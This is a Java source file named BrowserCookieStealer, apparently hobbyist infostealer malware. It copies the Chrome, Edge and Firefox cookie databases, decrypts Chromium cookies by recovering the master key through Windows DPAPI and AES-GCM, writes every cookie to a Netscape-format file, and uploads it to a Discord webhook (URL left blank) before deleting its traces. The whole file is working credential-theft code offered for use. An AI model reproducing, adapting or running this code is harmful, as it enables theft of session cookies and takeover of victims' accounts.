package org.example;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.sql.*;
import java.util.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import com.sun.jna.platform.win32.Crypt32Util;
//Mimilove code!
public class BrowserCookieStealer {

    public static void main(String[] args) {
        String webhookUrl = "";

        List<Cookie> cookies = new ArrayList<>();

        cookies.addAll(getChromiumCookies("Chrome",
                System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Cookies"));

        cookies.addAll(getChromiumCookies("Edge",
                System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Cookies"));

        cookies.addAll(getFirefoxCookies());

        System.out.println("Total cookies collected: " + cookies.size());

        if (!cookies.isEmpty()) {
            try {

                Path tempFile = Files.createTempFile("cookies", ".txt");
                try (BufferedWriter writer = Files.newBufferedWriter(tempFile, StandardCharsets.UTF_8)) {
                    writer.write("# Netscape HTTP Cookie File");
                    writer.newLine();
                    for (Cookie c : cookies) {

                        String domain = c.domain;
                        boolean domainFlag = domain.startsWith(".");
                        String flag = domainFlag ? "TRUE" : "FALSE";
                        String path = c.path != null ? c.path : "/";
                        String secure = c.secure ? "TRUE" : "FALSE";
                        long expiration = c.expiration > 0 ? c.expiration : 0;
                        writer.write(String.format("%s\t%s\t%s\t%s\t%d\t%s\t%s",
                                domain, flag, path, secure, expiration, c.name, c.value));
                        writer.newLine();
                    }
                }


                long size = Files.size(tempFile);
                Path fileToSend = tempFile;
                if (size > 8 * 1024 * 1024) {
                    System.out.println("File too large (" + size + " bytes), compressing...");
                    Path zipFile = Files.createTempFile("cookies", ".zip");
                    try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zipFile));
                         InputStream is = Files.newInputStream(tempFile)) {
                        zos.putNextEntry(new ZipEntry("cookies.txt"));
                        byte[] buffer = new byte[8192];
                        int len;
                        while ((len = is.read(buffer)) > 0) {
                            zos.write(buffer, 0, len);
                        }
                        zos.closeEntry();
                    }
                    fileToSend = zipFile;
                }


                sendFileToDiscord(webhookUrl, fileToSend.toFile(), "cookies_netscape.txt");
                Files.deleteIfExists(tempFile);
                if (fileToSend != tempFile) Files.deleteIfExists(fileToSend);

            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("No cookies found.");
        }
    }

    static class Cookie {
        String domain;
        String name;
        String value;
        String path;
        boolean secure;
        long expiration;

        Cookie(String domain, String name, String value, String path, boolean secure, long expiration) {
            this.domain = domain;
            this.name = name;
            this.value = value;
            this.path = path;
            this.secure = secure;
            this.expiration = expiration;
        }
    }

    private static List<Cookie> getChromiumCookies(String browser, String cookieDbPath) {
        List<Cookie> result = new ArrayList<>();
        File dbFile = new File(cookieDbPath);
        System.out.println("Checking " + cookieDbPath + " exists: " + dbFile.exists());
        if (!dbFile.exists()) return result;

        File tempDb = new File(System.getProperty("java.io.tmpdir"), browser + "_cookies_" + System.currentTimeMillis() + ".db");
        try {
            Files.copy(dbFile.toPath(), tempDb.toPath(), StandardCopyOption.REPLACE_EXISTING);
            Class.forName("org.sqlite.JDBC");

            try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempDb.getAbsolutePath());
                 Statement stmt = conn.createStatement();
                 ResultSet rs = stmt.executeQuery("SELECT host_key, name, encrypted_value, path, is_secure, expires_utc FROM cookies")) {

                byte[] masterKey = getChromiumMasterKey();
                System.out.println(browser + " master key retrieved: " + (masterKey != null));
                if (masterKey == null) return result;

                while (rs.next()) {
                    String host = rs.getString("host_key");
                    String name = rs.getString("name");
                    byte[] encrypted = rs.getBytes("encrypted_value");
                    if (encrypted == null || encrypted.length <= 15) continue;

                    byte[] nonce = Arrays.copyOfRange(encrypted, 3, 15);
                    byte[] ciphertext = Arrays.copyOfRange(encrypted, 15, encrypted.length);
                    String decrypted = decryptAesGcm(ciphertext, masterKey, nonce);
                    if (decrypted == null || decrypted.isEmpty()) continue;

                    String path = rs.getString("path");
                    boolean secure = rs.getInt("is_secure") == 1;
                    long expires = rs.getLong("expires_utc");

                    if (expires > 0) {
                        expires = (expires / 1000000) - 11644473600L;
                    } else {
                        expires = 0;
                    }

                    result.add(new Cookie(host, name, decrypted, path, secure, expires));
                }
                System.out.println(browser + " extracted " + result.size() + " cookies.");
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (tempDb.exists()) tempDb.delete();
        }
        return result;
    }

    private static byte[] getChromiumMasterKey() {
        try {
            Path localStatePath = Paths.get(System.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State");
            if (!localStatePath.toFile().exists()) {
                localStatePath = Paths.get(System.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Local State");
            }
            if (!localStatePath.toFile().exists()) return null;
            String content = new String(Files.readAllBytes(localStatePath));
            int start = content.indexOf("\"encrypted_key\":\"") + 18;
            int end = content.indexOf("\"", start);
            if (start < 18 || end < start) return null;
            String encryptedKeyB64 = content.substring(start, end);
            byte[] encryptedKey = Base64.getDecoder().decode(encryptedKeyB64);
            byte[] keyToDecrypt = Arrays.copyOfRange(encryptedKey, 5, encryptedKey.length);
            return Crypt32Util.cryptUnprotectData(keyToDecrypt);
        } catch (Exception e) {
            return null;
        }
    }

    private static String decryptAesGcm(byte[] ciphertext, byte[] key, byte[] nonce) {
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKey secretKey = new SecretKeySpec(key, "AES");
            GCMParameterSpec spec = new GCMParameterSpec(128, nonce);
            cipher.init(Cipher.DECRYPT_MODE, secretKey, spec);
            byte[] decrypted = cipher.doFinal(ciphertext);
            return new String(decrypted, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    //Тут получение файрфокс куки типо да
    private static List<Cookie> getFirefoxCookies() {
        List<Cookie> result = new ArrayList<>();
        Path profilesPath = Paths.get(System.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles");
        if (!profilesPath.toFile().exists()) return result;

        File[] profiles = profilesPath.toFile().listFiles(File::isDirectory);
        if (profiles == null) return result;

        for (File profile : profiles) {
            File cookiesFile = new File(profile, "cookies.sqlite");
            if (!cookiesFile.exists()) continue;

            File tempDb = new File(System.getProperty("java.io.tmpdir"), "ff_cookies_" + System.currentTimeMillis() + ".db");
            try {
                Files.copy(cookiesFile.toPath(), tempDb.toPath(), StandardCopyOption.REPLACE_EXISTING);
                Class.forName("org.sqlite.JDBC");
                try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempDb.getAbsolutePath());
                     Statement stmt = conn.createStatement();
                     ResultSet rs = stmt.executeQuery("SELECT host, name, value, path, isSecure, expiry FROM moz_cookies")) {

                    while (rs.next()) {
                        String host = rs.getString("host");
                        String name = rs.getString("name");
                        String value = rs.getString("value");
                        if (value == null || value.isEmpty()) continue;
                        String path = rs.getString("path");
                        boolean secure = rs.getInt("isSecure") == 1;
                        long expires = rs.getLong("expiry");
                        result.add(new Cookie(host, name, value, path, secure, expires));
                    }
                    System.out.println("Firefox extracted " + result.size() + " cookies from " + profile.getName());
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (tempDb.exists()) tempDb.delete();
            }
        }
        return result;
    }

    private static void sendFileToDiscord(String webhookUrl, File file, String fileName) {
        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        String CRLF = "\r\n";

        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(webhookUrl).openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream();
                 PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8), true)) {

                writer.append("--").append(boundary).append(CRLF);
                writer.append("Content-Disposition: form-data; name=\"payload_json\"").append(CRLF);
                writer.append("Content-Type: application/json").append(CRLF);
                writer.append(CRLF);
                writer.append("{\"content\": \"Cookies in Netscape format\"}").append(CRLF);

                writer.append("--").append(boundary).append(CRLF);
                writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(fileName).append("\"").append(CRLF);
                writer.append("Content-Type: application/octet-stream").append(CRLF);
                writer.append(CRLF);
                writer.flush();

                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buffer = new byte[8192];
                    int len;
                    while ((len = fis.read(buffer)) != -1) {
                        os.write(buffer, 0, len);
                    }
                    os.flush();
                }

                writer.append(CRLF);
                writer.append("--").append(boundary).append("--").append(CRLF);
                writer.flush();
            }

            int responseCode = conn.getResponseCode();
            System.out.println("File upload response: " + responseCode);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}